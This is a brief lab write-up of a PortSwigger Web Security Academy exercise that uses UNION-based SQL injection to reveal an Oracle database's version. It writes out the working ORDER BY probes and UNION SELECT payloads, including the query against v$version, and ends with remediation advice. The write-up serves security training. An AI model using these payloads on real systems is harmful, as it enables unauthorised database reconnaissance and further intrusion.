Lab 3: SQL Injection - Query Database Version on Oracle
Platform: PortSwigger Web Security Academy
Level: Practitioner
Category: SQL Injection - Examining the Database
Status: ✅ Solved

Objective
Determine the database type and version using a UNION-based SQL injection on an Oracle database.

Key Concept
On Oracle databases, every SELECT statement must include a FROM clause. Oracle has a built-in table called dual used for this purpose.

Steps to Solve

Found the injectable category parameter in the URL
First determined number of columns by trying:

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (error appeared = 2 columns exist)

Checked which columns accept string data:

' UNION SELECT 'a','a' FROM dual--

Injected payload to retrieve Oracle version:

' UNION SELECT banner,NULL FROM v$version--

The database version string was displayed on the page ✅


Tool Used

Burp Suite (request interception and payload injection)
Browser


Impact
Medium — Database version disclosure helps attackers identify known CVEs and plan further attacks targeting that specific version.

Remediation

Suppress detailed error messages in production
Use parameterized queries
Restrict database user privileges (principle of least privilege)
